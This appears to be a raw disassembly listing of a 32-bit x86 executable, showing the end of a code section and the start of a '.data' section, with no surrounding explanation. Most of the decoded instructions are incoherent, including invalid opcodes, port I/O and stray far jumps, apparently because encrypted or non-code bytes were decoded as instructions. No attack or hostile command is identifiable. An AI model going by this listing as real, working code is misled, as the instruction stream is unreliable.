  41c7d0:	add    eax,0x8f0322de
  41c7d5:	dec    ecx
  41c7d6:	packsswb mm6,QWORD PTR [edi+0xe56ccd1]
  41c7dd:	add    edx,DWORD PTR [edi+ebx*2-0x158e364e]
  41c7e4:	arpl   WORD PTR [eax-0x27],bp
  41c7e7:	mov    eax,0xbac75120
  41c7ec:	push   ecx
  41c7ed:	sub    ebx,0x42
  41c7f0:	mov    DWORD PTR [ecx+0x322ebf],0x7dbfcb44
  41c7fa:	jge    0x41c7cb
  41c7fc:	inc    edx
  41c7fd:	adc    DWORD PTR [esp+edi*8-0x73e04931],eax
  41c804:	adc    ecx,eax
  41c806:	add    DWORD PTR ds:0xf8fd0c85,eax
  41c80c:	bound  edi,QWORD PTR [eax-0x35fb7189]
  41c812:	lock lods eax,DWORD PTR ds:[esi]
  41c814:	mov    al,0x2f
  41c816:	add    DWORD PTR [ebp-0x2efedbc7],ebx
  41c81c:	mov    ecx,0x151e3d96
  41c821:	mov    eax,ds:0xba405a21
  41c826:	or     esi,ecx
  41c828:	add    DWORD PTR [edi-0x2bd90a01],eax
  41c82e:	ror    BYTE PTR [eax+eax*1-0x6af2cae4],cl
  41c835:	int    0x17
  41c837:	in     al,dx
  41c838:	test   eax,0xde3c8159
  41c83d:	ds (bad) 
  41c83f:	cwde   
  41c840:	mov    dl,0x4d
  41c842:	jecxz  0x41c7d4
  41c844:	es mov dh,0xad
  41c847:	dec    esp
  41c848:	add    esp,DWORD PTR [edi-0x7c]
  41c84b:	cli    
  41c84c:	xchg   ebp,eax
  41c84d:	xor    eax,DWORD PTR [edi-0x27]
  41c850:	std    
  41c851:	rcl    BYTE PTR [edx+0x3128cea2],1
  41c857:	pop    ebx
  41c858:	cdq    
  41c859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c85a:	out    0x8e,eax
  41c85c:	xchg   esi,eax
  41c85d:	dec    ebp
  41c85e:	dec    edx
  41c85f:	pop    eax
  41c860:	jo     0x41c7ed
  41c862:	int    0x67
  41c864:	sub    DWORD PTR [ebx],esi
  41c866:	mov    ss,WORD PTR [esi-0x58]
  41c869:	and    bh,BYTE PTR [eax+0x40]
  41c86c:	mov    eax,0xc65b8976
  41c871:	inc    ecx
  41c872:	sbb    edx,edi
  41c874:	rol    BYTE PTR [ecx+edx*8],cl
  41c877:	out    0x1f,eax
  41c879:	ins    BYTE PTR es:[edi],dx
  41c87a:	out    0x52,al
  41c87c:	jno    0x41c8a7
  41c87e:	cld    
  41c87f:	repz jnp 0x41c8bb
  41c882:	addr16 push edi
  41c884:	adc    DWORD PTR ds:[edi-0x45],ecx
  41c888:	js     0x41c8cc
  41c88a:	fdivp  st(1),st
  41c88c:	cmpps  xmm1,XMMWORD PTR [eax-0x4920c842],0x36
  41c894:	ret    
  41c895:	lahf   
  41c896:	push   edx
  41c897:	dec    esi
  41c898:	pop    es
  41c899:	cdq    
  41c89a:	mov    DWORD PTR [esi+0x9],ebx
  41c89d:	lds    esp,FWORD PTR ds:0xd7bb0b14
  41c8a3:	out    dx,al
  41c8a4:	push   0x70a43304
  41c8a9:	cmp    ebp,ebx
  41c8ab:	cmp    esp,DWORD PTR [ebp+0x706ebebf]
  41c8b1:	and    BYTE PTR [eax+0x50],ah
  41c8b4:	pop    es
  41c8b5:	xor    eax,0x2a3b3ab2
  41c8ba:	das    
  41c8bb:	inc    esi
  41c8bc:	pop    esp
  41c8bd:	pop    esp
  41c8be:	mov    esp,0x9aede01e
  41c8c3:	or     edi,ecx
  41c8c5:	das    
  41c8c6:	data16 mov al,0x43
  41c8c9:	sbb    bl,0x17
  41c8cc:	dec    esp
  41c8cd:	inc    esp
  41c8ce:	xlat   BYTE PTR ds:[ebx]
  41c8cf:	int    0xbe
  41c8d1:	test   BYTE PTR [edx+0x1d0f3ab8],0x4e
  41c8d8:	je     0x41c925
  41c8da:	mov    bl,0xb9
  41c8dc:	jl     0x41c865
  41c8de:	ror    edx,0xda
  41c8e1:	pushf  
  41c8e2:	mov    edi,0x88f85ce9
  41c8e7:	cmc    
  41c8e8:	(bad)  
  41c8e9:	mov    dh,0xf
  41c8eb:	cmp    BYTE PTR [edi],ch
  41c8ed:	push   0x1c03434a
  41c8f2:	sbb    cl,BYTE PTR [ebx+0x33]
  41c8f5:	rol    BYTE PTR [ecx],cl
  41c8f7:	pop    ebp
  41c8f8:	hlt    
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	(bad)  
  41c910:	fcom   DWORD PTR [edi+0x7ff718e5]
  41c916:	js     0x41c928
  41c918:	jle    0x41c992
  41c91a:	js     0x41c994
  41c91c:	ror    DWORD PTR [esi],1
  41c91e:	iret   
  41c91f:	jb     0x41c8f4
  41c921:	inc    ebp
  41c922:	jb     0x41c8c1
  41c924:	pop    ds
  41c925:	mov    al,ds:0x1e610d62
  41c92a:	push   ss
  41c92b:	fst    QWORD PTR [esi+eiz*4]
  41c92e:	push   es
  41c92f:	xchg   ebp,eax
  41c930:	(bad)  
  41c931:	jge    0x41c98a
  41c933:	test   eax,0x3bcb436e
  41c938:	jmp    0x41c92a
  41c93a:	push   0x7bc8eeb5
  41c93f:	aad    0x58
  41c941:	cld    
  41c942:	or     dl,bh
  41c944:	dec    ebp
  41c945:	repz adc edx,ebp
  41c948:	ret    
  41c949:	or     BYTE PTR [edx],dh
  41c94b:	fs pushf 
  41c94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c94e:	inc    eax
  41c94f:	out    0xc1,eax
  41c951:	or     ch,BYTE PTR [esi]
  41c953:	inc    ebx
  41c954:	out    0x68,eax
  41c956:	(bad)  
  41c957:	imul   dh
  41c959:	or     al,0xb0
  41c95b:	xchg   esi,eax
  41c95c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c95d:	cmp    al,0xcc
  41c95f:	jecxz  0x41c9d2
  41c961:	hlt    
  41c962:	in     al,0x74
  41c964:	adc    DWORD PTR [ecx-0x3da30c80],esp
  41c96a:	test   eax,0xeaa210da
  41c96f:	mov    edx,0xd621f7b3
  41c974:	cmp    al,0x5c
  41c976:	xchg   esp,eax
  41c977:	stos   BYTE PTR es:[edi],al
  41c978:	pop    ecx
  41c979:	stos   BYTE PTR es:[edi],al
  41c97a:	ins    BYTE PTR es:[edi],dx
  41c97b:	dec    eax
  41c97c:	pop    eax
  41c97d:	xchg   BYTE PTR [ecx+0x0],dl
  41c980:	mov    dh,BYTE PTR [edx-0x2d]
  41c983:	xchg   BYTE PTR [esi-0x28],ch
  41c986:	ret    0x4a8a
  41c989:	cmc    
  41c98a:	and    BYTE PTR [ecx+0x43],dl
  41c98d:	xor    esp,DWORD PTR [ebp+0x6b]
  41c990:	add    bl,BYTE PTR [eax+0x2d]
  41c993:	sub    esi,esp
  41c995:	mov    ds:0x1ab85525,eax
  41c99a:	push   esp
  41c99b:	hlt    
  41c99c:	pusha  
  41c99d:	jnp    0x41c9cc
  41c99f:	in     eax,0xcb
  41c9a1:	inc    edi
  41c9a2:	pop    esp
  41c9a3:	mov    ebp,0xbc8f6ebb
  41c9a8:	ja     0x41c9a5
  41c9aa:	dec    ebp
  41c9ab:	std    
  41c9ac:	pop    ss
  41c9ad:	push   edi
  41c9ae:	rcl    BYTE PTR [eax-0x482b192a],1
  41c9b4:	jmp    0x431f:0xaa6e2857
  41c9bb:	or     DWORD PTR [esi-0x65],esi
  41c9be:	sti    
  41c9bf:	sbb    bl,0xb1
  41c9c2:	in     al,0x8
  41c9c4:	mov    edx,0xca92f1ba
  41c9c9:	mov    ah,0x22
  41c9cb:	aaa    
  41c9cc:	push   es
  41c9cd:	mov    ecx,0x212e8142
  41c9d2:	adc    al,0x35
  41c9d4:	jecxz  0x41c9fb
  41c9d6:	sub    esi,0x12
  41c9d9:	shr    BYTE PTR [ebp+0x1d],0x9e
  41c9dd:	jecxz  0x41ca1f
  41c9df:	sub    dl,bl
  41c9e1:	adc    ah,al
  41c9e3:	ret    0xd0ab
  41c9e6:	imul   esi,DWORD PTR [ebx],0xffffffbb
  41c9e9:	pop    ebp
  41c9ea:	fild   WORD PTR [edx]
  41c9ec:	dec    edi
  41c9ed:	imul   edi,DWORD PTR [edi],0x6887a0cd
  41c9f3:	sar    BYTE PTR [ecx+0x1e],1
  41c9f6:	sub    DWORD PTR [ebx-0x4b],ecx
  41c9f9:	xchg   ebx,eax
  41c9fa:	sub    dl,bl
  41c9fc:	dec    ebp
  41c9fd:	leavew 
  41c9ff:	dec    ecx
  41ca00:	jae    0x41c9c7
  41ca02:	jg     0x41c9ac
  41ca04:	(bad)  
  41ca05:	pop    esp
  41ca06:	lock pushf 
  41ca08:	inc    esp
  41ca09:	loop   0x41c9f7
  41ca0b:	mov    dh,BYTE PTR [edi]
  41ca0d:	adc    bl,BYTE PTR [edi]
  41ca0f:	cmc    
  41ca10:	mov    ecx,0x575e709d
  41ca15:	pause  
  41ca17:	or     cl,0xed
  41ca1a:	jmp    0x448c:0x22b7864e
  41ca21:	daa    
  41ca22:	or     BYTE PTR [ebx+0x5844f11d],ch
  41ca28:	jnp    0x41c9b3
  41ca2a:	jle    0x41ca0e
  41ca2c:	mov    eax,ds:0x807dff0f
  41ca31:	mov    esi,0x83628961
  41ca36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca37:	xchg   ebp,eax
  41ca38:	les    ebp,FWORD PTR [ecx+esi*1-0x22]
  41ca3c:	mov    ds:0xa67d03e8,eax
  41ca41:	adc    esi,DWORD PTR [edi+0x45]
  41ca44:	dec    edi
  41ca45:	and    DWORD PTR [esi+ecx*2],0xfffffffa
  41ca49:	addr16 test WORD PTR fs:[bp+di],sp
  41ca4f:	mov    ecx,0xbd6d960e
  41ca54:	out    0x78,eax
  41ca56:	pop    eax
  41ca57:	enter  0xcd6d,0x14
  41ca5b:	cmc    
  41ca5c:	jbe    0x41cac0
  41ca5e:	scas   eax,DWORD PTR es:[edi]
  41ca5f:	dec    ebx
  41ca60:	and    al,0x7c
  41ca62:	and    dl,ch
  41ca64:	(bad)  
  41ca65:	mov    bh,BYTE PTR [edx]
  41ca67:	fwait
  41ca68:	xchg   edi,eax
  41ca69:	xor    eax,0xab7dc55
  41ca6e:	jg     0x41cab3
  41ca70:	mov    esi,0xe3516796
  41ca75:	xchg   esi,eax
  41ca76:	call   0xcdc:0x26a23ddc
  41ca7d:	mov    bl,0x43
  41ca7f:	ret    
  41ca80:	sbb    dh,BYTE PTR [esi-0x3a31be21]
  41ca86:	lds    esi,FWORD PTR [edx-0x29]
  41ca89:	jp     0x41ca5a
  41ca8b:	add    DWORD PTR [edx+0x16],edi
  41ca8e:	mov    dl,0xcf
  41ca90:	cmp    al,0x28
  41ca92:	mov    esp,0x61a64e60
  41ca97:	mov    eax,DWORD PTR [ecx]
  41ca99:	test   bh,0x55
  41ca9c:	je     0x41cafb
  41ca9e:	lods   al,BYTE PTR ds:[esi]
  41ca9f:	cmp    ah,BYTE PTR [eax-0x40d4bb7b]
  41caa5:	add    al,0x61
  41caa7:	sub    DWORD PTR [ebp+0x16],ebp
  41caaa:	push   eax
  41caab:	push   ds
  41caac:	iret   
  41caad:	mov    ah,0x4a
  41caaf:	fidivr WORD PTR [edi]
  41cab1:	or     al,0xad
  41cab3:	iret   
  41cab4:	inc    eax
  41cab5:	mov    cl,0x66
  41cab7:	mov    ecx,0x5ab078e7
  41cabc:	mov    DWORD PTR [eax],ebx
  41cabe:	js     0x41ca77
  41cac0:	mov    eax,0xfda129a0
  41cac5:	(bad)  
  41cac6:	out    dx,al
  41cac7:	fwait
  41cac8:	sub    ebp,esp
  41caca:	cmc    
  41cacb:	sbb    DWORD PTR [edi+0x78],eax
  41cace:	in     eax,dx
  41cacf:	jp     0x41ca6c
  41cad1:	cld    
  41cad2:	sub    BYTE PTR [ecx-0x44946c16],al
  41cad8:	in     al,0xaf
  41cada:	mov    edi,0x3c98f805
  41cadf:	std    
  41cae0:	inc    edi
  41cae1:	sbb    al,bh
  41cae3:	jno    0x41ca91
  41cae5:	push   ds
  41cae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cae7:	sbb    BYTE PTR [eiz*4-0x279418c3],dl
  41caee:	loopne 0x41ca79
  41caf0:	and    ebp,0xf6886690
  41caf6:	sbb    BYTE PTR [esi-0x1e],dl
  41caf9:	shr    DWORD PTR [esi-0x1d64a941],1
  41caff:	ins    DWORD PTR es:[edi],dx
  41cb00:	adc    eax,0xe866cb1f
  41cb05:	retf   
  41cb06:	mov    DWORD PTR [ebp-0x5e6bac17],ebp
  41cb0c:	push   edx
  41cb0d:	dec    edx
  41cb0e:	rol    BYTE PTR [ebx+eax*8+0x4a24604],cl
  41cb15:	(bad)  
  41cb16:	fmul   QWORD PTR [edx-0x6ad8f93d]
  41cb1c:	sbb    ebx,DWORD PTR [eax-0x65]
  41cb1f:	fnsave [ebx]
  41cb21:	aam    0x74
  41cb23:	imul   eax,DWORD PTR [edx+0x173fec4a],0xfffffffd
  41cb2a:	jle    0x41caf1
  41cb2c:	fmulp  st(1),st
  41cb2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb2f:	and    ebp,DWORD PTR [ebp-0x16a13731]
  41cb35:	xor    BYTE PTR [edx],al
  41cb37:	add    BYTE PTR [eax],al
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x48ce6037
  41cb47:	dec    edx
  41cb48:	jecxz  0x41cb7a
  41cb4a:	cmc    
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41caf5
  41cb52:	std    
  41cb53:	adc    DWORD PTR [ebx],ebp
  41cb55:	add    DWORD PTR ds:0x28e55807,esi
  41cb5b:	push   ss
  41cb5c:	lock push es
  41cb5e:	or     ecx,edx
  41cb60:	cs push es
  41cb62:	sub    esi,esp
  41cb64:	hlt    
  41cb65:	inc    edx
  41cb66:	mov    ?,WORD PTR [esi-0x51165f62]
  41cb6c:	cli    
  41cb6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb6e:	aad    0xa3
  41cb70:	push   edx
  41cb71:	or     al,0x10
  41cb73:	shl    DWORD PTR [edi+0x1d],cl
  41cb76:	sub    ebp,esp
  41cb78:	jb     0x41cb58
  41cb7a:	sar    esp,cl
  41cb7c:	push   esi
  41cb7d:	sub    edi,edx
  41cb7f:	adc    edi,DWORD PTR [esi+0x2b28a085]
  41cb85:	hlt    
  41cb86:	and    ebp,esp
  41cb88:	stos   DWORD PTR es:[edi],eax
  41cb89:	jl     0x41cb43
  41cb8b:	inc    ecx
  41cb8c:	xchg   edx,eax
  41cb8d:	jl     0x41cbce
  41cb8f:	jmp    0xa01edc0b
  41cb94:	jne    0x41cbda
  41cb96:	add    BYTE PTR [ecx-0x35aabc04],al
  41cb9c:	and    al,0xb5
  41cb9e:	sub    ch,al
  41cba0:	mov    ds:0xca37190d,eax
  41cba5:	and    BYTE PTR [esi],dl
  41cba7:	scas   eax,DWORD PTR es:[edi]
  41cba8:	stos   BYTE PTR es:[edi],al
  41cba9:	push   ss
  41cbaa:	mul    ch
  41cbac:	fmul   DWORD PTR [edi+0x72]
  41cbaf:	fimul  WORD PTR [ecx]
  41cbb1:	jns    0x41cbfa
  41cbb3:	mov    edx,0x1024fdba
  41cbb8:	pop    ds
  41cbb9:	sbb    DWORD PTR [ebp-0x65],ebp
  41cbbc:	or     bl,al
  41cbbe:	mov    bl,0x26
  41cbc0:	test   BYTE PTR [ebp-0x21d7f7e1],ah
  41cbc6:	pop    ss
  41cbc7:	mov    al,0xd2
  41cbc9:	das    
  41cbca:	ret    0x310b
  41cbcd:	int    0xa8
  41cbcf:	jo     0x41cb7c
  41cbd1:	sti    
  41cbd2:	ds sbb eax,0xf5752cc6
  41cbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbd9:	nop
  41cbda:	xlat   BYTE PTR ds:[ebx]
  41cbdb:	jns    0x41cbe1
  41cbdd:	adc    al,0x72
  41cbdf:	fiadd  WORD PTR [ebp-0x5d]
  41cbe2:	dec    edi
  41cbe3:	jbe    0x41cc52
  41cbe5:	fwait
  41cbe6:	or     al,0xc4
  41cbe8:	sub    eax,0x902eb7ca
  41cbed:	jno    0x41cc60
  41cbef:	push   esp
  41cbf0:	dec    ebp
  41cbf1:	das    
  41cbf2:	aaa    
  41cbf3:	outs   dx,BYTE PTR ds:[esi]
  41cbf4:	adc    bl,BYTE PTR [edi]
  41cbf6:	jo     0x41cbef
  41cbf8:	inc    edx
  41cbf9:	mov    dl,0x15
  41cbfb:	push   ebx
  41cbfc:	ins    BYTE PTR es:[edi],dx
  41cbfd:	addr16 cmc 
  41cbff:	mov    ebp,0x70d206fb
  41cc04:	dec    ebx
  41cc05:	inc    ecx
  41cc06:	out    0xf9,eax
  41cc08:	sahf   
  41cc09:	xchg   ebx,eax
  41cc0a:	sub    edx,0x11
  41cc0d:	stos   DWORD PTR es:[edi],eax
  41cc0e:	pop    ss
  41cc0f:	or     DWORD PTR [esi+0x4b],ebx
  41cc12:	cmp    eax,0xc3cff4a3
  41cc17:	inc    esi
  41cc18:	or     ch,0xf2
  41cc1b:	mov    ebx,0x30a1b18b
  41cc20:	add    ebx,DWORD PTR [esi-0x294e3c95]
  41cc26:	mov    dh,0xa1
  41cc28:	adc    eax,0x93263cb1
  41cc2d:	push   ds
  41cc2e:	or     BYTE PTR [ecx],bh
  41cc30:	repnz sbb al,0x39
  41cc33:	xchg   BYTE PTR [ecx+0x61b90c8a],bh
  41cc39:	(bad)  
  41cc3a:	fstp   QWORD PTR [edx+0x3e]
  41cc3d:	loop   0x41cc1d
  41cc3f:	mov    bl,0xeb
  41cc41:	adc    ebx,DWORD PTR [esi]
  41cc43:	cs or  al,0x4d
  41cc46:	cmp    DWORD PTR [edx],0x7307ff08
  41cc4c:	dec    esp
  41cc4d:	dec    esp
  41cc4e:	cmc    
  41cc4f:	mov    esi,DWORD PTR [edi]
  41cc51:	mov    al,ds:0x25ff3bba
  41cc56:	push   cs
  41cc57:	xchg   ecx,eax
  41cc58:	cmp    BYTE PTR [ecx],bl
  41cc5a:	inc    esp
  41cc5b:	mov    ebx,0x40969559
  41cc60:	out    dx,eax
  41cc61:	cmp    DWORD PTR [eax-0x28],eax
  41cc64:	add    ecx,edx
  41cc66:	jp     0x41cc51
  41cc68:	test   eax,0x587e057a
  41cc6d:	stc    
  41cc6e:	cld    
  41cc6f:	es mov edi,0xb5acc2b3
  41cc75:	jae    0x41cc0e
  41cc77:	jge    0x41cc3e
  41cc79:	xor    ebx,DWORD PTR [ecx-0xf]
  41cc7c:	aad    0x64
  41cc7e:	cmp    al,0xfb
  41cc80:	adc    eax,0x7bb0f529
  41cc85:	or     ebp,DWORD PTR [ebx]
  41cc87:	pop    eax
  41cc88:	and    DWORD PTR ds:0xd3f2ef5f,0x33ab9132
  41cc92:	into   
  41cc93:	cmp    al,0x4
  41cc95:	mov    esp,0xcc61909d
  41cc9a:	retf   
  41cc9b:	ja     0x41ccf5
  41cc9d:	nop
  41cc9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc9f:	mov    ebx,0x716ae392
  41cca4:	rcl    ch,1
  41cca6:	jo     0x41cc7c
  41cca8:	xlat   BYTE PTR ds:[ebx]
  41cca9:	mov    esp,0xe123ed19
  41ccae:	sbb    dl,0xa0
  41ccb1:	lods   al,BYTE PTR ds:[esi]
  41ccb2:	cmp    eax,0x3e94ad9
  41ccb7:	sbb    dl,BYTE PTR fs:[eax+0x5]
  41ccbb:	mov    ch,0x8c
  41ccbd:	or     WORD PTR [ebx+0x6c],0x1216
  41ccc3:	add    BYTE PTR [ebx],dl
  41ccc5:	(bad)  
  41ccc6:	enter  0x3262,0x76
  41ccca:	mov    ah,0xd8
  41cccc:	mov    eax,ds:0x83757b66
  41ccd1:	push   0x75
  41ccd3:	mov    eax,0x32c2b4e7
  41ccd8:	mov    eax,ds:0xc5993703
  41ccdd:	test   cl,0x1c
  41cce0:	enter  0xfca0,0x24
  41cce4:	je     0x41ccac
  41cce6:	mov    bl,0xa7
  41cce8:	mov    esp,0xbb01ba30
  41cced:	shr    DWORD PTR [eax+ebx*4-0x42],cl
  41ccf1:	shl    DWORD PTR [edi-0x1f],1
  41ccf4:	in     al,0xab
  41ccf6:	sbb    ebp,DWORD PTR [edx-0x3f59405b]
  41ccfc:	xchg   esp,eax
  41ccfd:	mov    cl,0x99
  41ccff:	(bad)  
  41cd00:	es scas eax,DWORD PTR es:[edi]
  41cd02:	inc    ebp
  41cd03:	pop    eax
  41cd04:	imul   edx,DWORD PTR [ecx+0x4d],0xd5843b42
  41cd0b:	dec    esp
  41cd0c:	pop    esp
  41cd0d:	and    BYTE PTR [ecx],0xd
  41cd10:	fsubr  DWORD PTR [edx-0x7d86aa5f]
  41cd16:	into   
  41cd17:	mov    cl,0x34
  41cd19:	xor    dl,BYTE PTR [edi+0x1e4ff9d8]
  41cd1f:	icebp  
  41cd20:	mov    edi,0x6cc6911b
  41cd25:	pop    esp
  41cd26:	dec    eax
  41cd27:	bound  edx,QWORD PTR [esi+0x1]
  41cd2a:	xchg   esi,eax
  41cd2b:	ins    BYTE PTR es:[edi],dx
  41cd2c:	dec    edi
  41cd2d:	cmp    al,0x46
  41cd2f:	dec    ebp
  41cd30:	fwait
  41cd31:	push   cs
  41cd32:	emms   
  41cd34:	sub    eax,0x7fc0d7c9
  41cd39:	pop    ds
  41cd3a:	jno    0x41cd2a
  41cd3c:	(bad)  
  41cd3d:	cmp    cl,bh
  41cd3f:	ficomp DWORD PTR [esi]
  41cd41:	xchg   bh,dh
  41cd43:	mov    bl,0x92
  41cd45:	scas   eax,DWORD PTR es:[edi]
  41cd46:	jae    0x41cd17
  41cd48:	mov    ebx,0x616e1def
  41cd4d:	dec    ecx
  41cd4e:	and    DWORD PTR [edi-0x48],esp
  41cd51:	add    BYTE PTR [ecx+0x4f],ch
  41cd54:	lock int3 
  41cd56:	and    DWORD PTR [ebp+edx*1+0x73],esp
  41cd5a:	inc    ebp
  41cd5b:	add    BYTE PTR [edi+0x2aa9ed09],dl
  41cd61:	ins    BYTE PTR es:[edi],dx
  41cd62:	and    BYTE PTR [esi+0x3d],al
  41cd65:	xor    DWORD PTR [ecx-0x36a43560],eax
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
